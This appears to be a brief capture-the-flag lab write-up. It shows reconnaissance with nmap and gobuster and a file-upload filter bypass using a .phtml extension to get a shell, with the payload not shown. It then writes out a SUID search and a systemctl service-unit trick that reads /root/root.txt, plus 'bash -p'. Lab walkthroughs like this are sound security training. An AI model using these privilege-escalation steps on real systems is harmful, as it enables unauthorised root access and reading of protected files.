First I run nmap:

![](attachment/f15aa9c22cc5003af75575e62ef9c3d3.png)

then I run gobuster to find subdomains

![](attachment/e3057613836a7d43b53dab4f193bd816.png)

I go to /internal and it has a file upload after many testing it does not accept php file it accept phtml so I renamed the extinsion to .phtml and uploaded the file

![](attachment/c734fc5e4050c7f01815d8d7ffd028ac.png)

![](attachment/6b8682105701164502fa6ce3bb6af982.png)

I was setting up a listener and I got a shell!

then **privilege escalation:**

```Less
find / -user root -perm -4000 -exec ls -ldb {} \;
```

/bin/systemctl stands out, at it is used to control and monitor services!

![](attachment/8c5bf233621b880cb0f86bb290180c1e.png)

```Less
TF=$(mktemp).service
echo '[Service]
Type=oneshot
ExecStart=/bin/sh -c "cat /root/root.txt > /tmp/output"
[Install]
WantedBy=multi-user.target' > $TF
./systemctl link $TF
./systemctl enable --now $TF
```

![](attachment/4bc155b4c4374a4e17c7d1392b404581.png)

```Less
bash -p
```

The p flag means we are running it privileged.

![](attachment/d42edfd683b7f9f478987c399a6590aa.png)